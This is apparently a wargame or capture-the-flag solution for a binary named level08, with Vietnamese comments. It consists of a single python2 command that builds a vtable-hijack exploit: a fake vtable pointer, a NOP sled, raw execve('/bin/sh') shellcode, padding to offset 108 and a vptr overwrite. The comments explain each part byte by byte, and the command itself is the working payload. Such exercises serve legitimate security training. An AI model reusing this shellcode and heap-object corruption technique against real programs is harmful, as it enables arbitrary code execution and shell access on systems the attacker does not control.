# 1. Chạy payload khai thác tiêm thẳng Shellcode vào trong input
# - 4 bytes đầu "\x18\xea\x04\x08": Fake con trỏ hàm trong VTable, trỏ ngay đến Shellcode (0x0804ea18).
# - 38 bytes tiếp theo: NOP Sled và đoạn mã Shellcode mở /bin/sh.
# - 62 bytes "A": Padding để đủ offset 108 bytes chạm tới vptr của đối tượng sau.
# - 4 bytes cuối "\x14\xea\x04\x08": Ghi đè vptr trỏ về Fake VTable (0x0804ea14).
/levels/level08 $(python2 -c 'print "\x18\xea\x04\x08" + "\x90"*4 + "\xeb\x18\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh" + "A"*62 + "\x14\xea\x04\x08"')
